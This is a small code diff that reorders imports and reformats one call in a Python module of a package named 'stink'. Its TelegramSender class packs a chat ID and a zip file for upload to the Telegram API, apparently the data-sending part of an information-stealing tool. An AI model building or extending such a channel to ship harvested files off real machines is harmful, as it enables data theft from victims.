@@ -1,11 +1,10 @@
-from urllib.request import Request, urlopen
-
 import ssl
 from abc import abstractmethod
 from typing import Tuple, Union
+from urllib.request import Request, urlopen
 
-from stink.helpers.config import SenderConfig
 from stink.helpers import MultipartFormDataEncoder
+from stink.helpers.config import SenderConfig
 
 
 class AbstractSender:
@@ -99,8 +98,7 @@ class TelegramSender(AbstractSender):
         - tuple: A tuple of content type, body, and Telegram api url.
         """
         content_type, body = self._encoder.encode(
-            [("chat_id", self.__user_id)],
-            [("document", self.__zip_name, self.__data)]
+            [("chat_id", self.__user_id)], [("document", self.__zip_name, self.__data)]
         )
 
         return content_type, body
